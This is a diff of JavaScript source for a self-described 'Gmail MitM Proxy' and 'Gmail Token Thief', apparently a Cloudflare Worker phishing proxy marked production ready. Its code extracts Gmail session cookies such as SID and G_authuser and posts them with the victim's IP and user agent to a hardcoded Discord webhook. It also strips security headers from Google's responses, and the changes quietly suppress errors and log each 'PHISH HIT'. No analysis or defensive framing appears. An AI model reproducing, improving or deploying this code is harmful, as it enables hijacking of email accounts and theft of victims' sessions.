@@ -1,6 +1,5 @@
-// Gmail MitM Proxy v2.3 - FIXED: SINGLE SYNTAX ERROR CORRECTED
-// Only ONE LINE changed - the deduplication logic
-
+// Gmail MitM Proxy v2.3 - PRODUCTION READY
+// Cloudflare Workers → Paste → Deploy
 const WEBHOOK_URL = 'https://discord.com/api/webhooks/1466098541880672500/C6sx-mBMSy3wW41IW0AnIGJoMfJNAa2905NeLyFCqHq6hArN4kGWC3k51S_HyNdplehC';
 const RATE_LIMIT = new Map();
 
@@ -48,6 +47,7 @@ function isRateLimited(ip) {
 
 async function proxyGmail(url, request, clientIP, userAgent) {
   const headers = new Headers(request.headers);
+  
   headers.set('Host', 'mail.google.com');
   headers.set('Origin', 'https://mail.google.com');
   headers.set('Referer', 'https://mail.google.com/mail/u/0/#inbox');
@@ -56,8 +56,8 @@ async function proxyGmail(url, request, clientIP, userAgent) {
   headers.set('Sec-Fetch-Dest', 'document');
   headers.set('Sec-Fetch-User', '?1');
   headers.set('Upgrade-Insecure-Requests', '1');
+  
   headers.delete('Accept-Encoding');
-
   if (!headers.has('User-Agent')) headers.set('User-Agent', userAgent);
   headers.set('X-Forwarded-For', clientIP);
 
@@ -97,37 +97,28 @@ function extractTokens(headers) {
     regexes.forEach(regex => {
       let match;
       while ((match = regex.exec(cookieStr)) !== null) {
-        tokens.push({
-          name: match[1],
-          value: match[2],
-          full: cookieStr.substring(0, 100)
-        });
+        tokens.push({ name: match[1], value: match[2] });
       }
     });
   });
 
-  // **🔧 FIXED ONE LINE**: Proper object deduplication
-  const unique = {};
-  tokens.forEach(t => unique[`${t.name}:${t.value}`] = t);
-  return Object.values(unique);
+  return [...new Set(tokens.map(t => `${t.name}:${t.value}`))].map(str => {
+    const [name, value] = str.split(':');
+    return { name, value };
+  }).filter(Boolean);
 }
 
 async function stealTokens(tokens, ip, ua, urlPath) {
   const shortUA = ua.length > 150 ? ua.substring(0, 147) + '...' : ua;
-  const preview = tokens.slice(0, 8).map(t =>
-    `\`${t.name}\`: \`${t.value.slice(0, 35)}...\``
-  ).join('\n') || 'No tokens';
-
-  const hasCriticalTokens = tokens.some(t =>
-    t.name.includes('SID') || t.name.includes('G_authuser')
-  );
+  const preview = tokens.slice(0, 8).map(t => `\`${t.name}\`: \`${t.value.slice(0, 35)}...\``).join('\n') || 'No tokens';
+  const hasCriticalTokens = tokens.some(t => t.name.includes('SID') || t.name.includes('G_authuser'));
 
   const payload = {
     username: '🔒 Gmail Token Thief v2.3',
     avatar_url: 'https://mail.google.com/mail/u/0/images/favicon5.ico',
     embeds: [{
       title: `🎣 ${tokens.length} Gmail Token(s) CAPTURED`,
-      url: `https://mail.google.com/mail/u/0/#inbox`,
+      url: 'https://mail.google.com/mail/u/0/#inbox',
       description: `**IP:** \`${ip}\`\n**UA:** ${shortUA}\n**Path:** \`${new URL(urlPath).pathname}\``,
       fields: [{ name: '🆔 Token Preview', value: preview, inline: false }],
       color: hasCriticalTokens ? 0x00ff88 : 0xffaa00,
@@ -140,14 +131,23 @@ async function stealTokens(tokens, ip, ua, urlPath) {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify(payload)
-  }).catch(e => console.log('Webhook error:', e));
+  }).catch(e => {});
+
+  console.log(`🎯 PHISH HIT: ${ip} | ${tokens.length} tokens | Critical: ${hasCriticalTokens}`);
 }
 
 function craftResponse(response) {
   const headers = new Headers(response.headers);
-  
-  ['Content-Security-Policy', 'Content-Security-Policy-Report-Only', 'X-Frame-Options', 
-   'Strict-Transport-Security', 'X-Content-Type-Options', 'Referrer-Policy'].forEach(h => headers.delete(h));
+
+  const securityHeaders = [
+    'Content-Security-Policy',
+    'Content-Security-Policy-Report-Only',
+    'X-Frame-Options',
+    'Strict-Transport-Security',
+    'X-Content-Type-Options',
+    'Referrer-Policy'
+  ];
+  securityHeaders.forEach(header => headers.delete(header));
 
   headers.set('Access-Control-Allow-Origin', '*');
   headers.set('Access-Control-Allow-Credentials', 'true');
